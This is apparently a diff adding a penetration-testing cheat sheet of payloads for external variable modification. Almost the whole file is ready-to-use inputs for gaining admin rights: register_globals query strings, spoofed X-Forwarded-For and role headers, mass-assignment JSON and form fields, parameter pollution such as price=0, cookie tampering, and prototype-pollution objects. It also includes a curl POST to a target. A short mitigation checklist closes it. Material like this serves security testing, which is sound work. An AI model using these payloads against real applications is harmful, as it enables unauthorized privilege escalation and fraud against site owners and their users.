@@ -1,0 +1,136 @@
+# External Variable Modification
+
+## ========================================
+## PHP REGISTER_GLOBALS (Legacy)
+## ========================================
+
+# Exploit register_globals=On
+?admin=1
+?authenticated=true
+?user_level=admin
+?GLOBALS[admin]=1
+
+# Session variable manipulation
+?_SESSION[user_id]=1
+?_SESSION[is_admin]=true
+
+# Server variable manipulation
+?_SERVER[REMOTE_ADDR]=127.0.0.1
+?_SERVER[HTTP_HOST]=localhost
+
+## ========================================
+## ENVIRONMENT VARIABLES
+## ========================================
+
+# HTTP headers as environment variables
+HTTP_X_FORWARDED_FOR: 127.0.0.1
+HTTP_CLIENT_IP: 127.0.0.1
+HTTP_X_REAL_IP: 127.0.0.1
+HTTP_X_ORIGINATING_IP: 127.0.0.1
+
+# Custom headers
+HTTP_X_ADMIN: true
+HTTP_X_ROLE: administrator
+
+## ========================================
+## MASS ASSIGNMENT
+## ========================================
+
+# JSON payloads
+{"is_admin": true}
+{"role": "administrator"}
+{"user_level": 99}
+{"verified": true}
+{"premium": true}
+
+# Form data
+user[is_admin]=1
+user[role]=admin
+user[credits]=999999
+
+## ========================================
+## PARAMETER POLLUTION
+## ========================================
+
+# HTTP Parameter Pollution
+?role=user&role=admin
+?price=100&price=0
+?admin=0&admin=1
+
+## ========================================
+## COOKIE MANIPULATION
+## ========================================
+
+# Modify cookies
+Cookie: admin=true
+Cookie: role=administrator
+Cookie: user_level=5
+
+## ========================================
+## NODEJS/EXPRESS
+## ========================================
+
+# Prototype pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+
+## ========================================
+## RUBY ON RAILS
+## ========================================
+
+# Mass assignment
+user[admin]=true
+user[role_id]=1
+
+## ========================================
+## PYTHON/DJANGO
+## ========================================
+
+# Form manipulation
+is_staff=True
+is_superuser=True
+is_active=True
+
+## ========================================
+## ASP.NET
+## ========================================
+
+# ViewState manipulation
+# Model binding exploitation
+IsAdmin=true
+Role=Administrator
+
+## ========================================
+## TESTING
+## ========================================
+
+# 1. Identify modifiable parameters
+# 2. Add extra parameters
+?existing=value&admin=true
+
+# 3. Test mass assignment
+{"username": "test", "role": "admin"}
+
+# 4. Test prototype pollution
+{"__proto__": {"isAdmin": true}}
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite
+- Add/modify parameters
+- Parameter miner extension
+
+# Manual testing
+curl -X POST -d '{"admin":true}' target.com
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Check if application:
+- Whitelists allowed parameters
+- Validates parameter types
+- Blocks unexpected parameters
+- Sanitizes external input
